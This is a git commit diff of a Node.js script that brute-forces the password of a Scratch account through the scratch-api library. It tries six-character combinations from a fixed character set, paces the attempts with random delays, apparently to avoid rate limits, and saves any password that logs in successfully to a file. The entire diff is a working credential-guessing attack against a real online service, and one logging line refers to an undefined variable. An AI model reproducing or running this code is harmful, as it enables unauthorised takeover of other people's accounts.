cacbb9bfd68491151ae57aecd176ec98fc8eccb5
Int Fract <110207136+intfract@users.noreply.github.com>
2023-01-08 23:58:03 +0000

    brute force completed

--- index.js
+++ index.js
@@ -1,5 +1,6 @@
 const Scratch = require('scratch-api')
 const fs = require('fs')
+const { time } = require('console')
 require('dotenv').config()
 
 const chars = ['etainoshrdlucmfzwygpbvx0123456789', 'etainoshrdlucmfzwygpbvkjxqETAINOSHRDLUCMFZWYGPBVKJXQ0123456789']
@@ -10,25 +11,34 @@ const common = [
   'scratch',
 ]
 
+function round(n, to) {
+  return Math.round(n / ((to) ? to : 1)) * ((to) ? to : 1)
+}
+
 function enter(username, password) {
   Scratch.UserSession.create(username, password, (err, user) => {
     if (err) return console.log(err)
-    fs.writeFileSync('out.txt', password)
+    if (user) fs.writeFileSync('out.txt', password)
   })
 }
 
-function generate(spread, depth, options, blacklist, callback) {
-  const a = []
-  for (let n = 0; n < spread ** depth; n++) {
-    setTimeout(() => {
-      for (let i = 0; i < depth; i++) {
-        a[i] = Math.floor((n * spread * spread ** i) / (spread ** depth)) % spread
-      }
-      console.log(a, n)
-    }, n * 1)
+function loop(n, spread, depth, options, callback) {
+  if (n < spread ** depth) {
+    console.log(n)
+    const a = []
+    for (let i = 0; i < depth; i++) {
+      a[i] = options[Math.floor((n * spread * spread ** i) / (spread ** depth)) % spread]
+    }
+    callback(a.join(''))
+    n++
+    const delay = (Math.random() + 1) * 1000
+    console.log(`${round(delay)}ms`)
+    setTimeout(() => loop(n, spread, depth, options, callback), delay)
+  } else {
+    console.log(`Ended at ${i}!`)
   }
 }
 
-// generate(chars[0].length, 2, chars[0], common, (x, n) => {})
+loop(0, chars[0].length, 6, chars[0], (x) => enter(process.env.usr, x))
 
 // enter(process.env.usr, process.env.pwd)
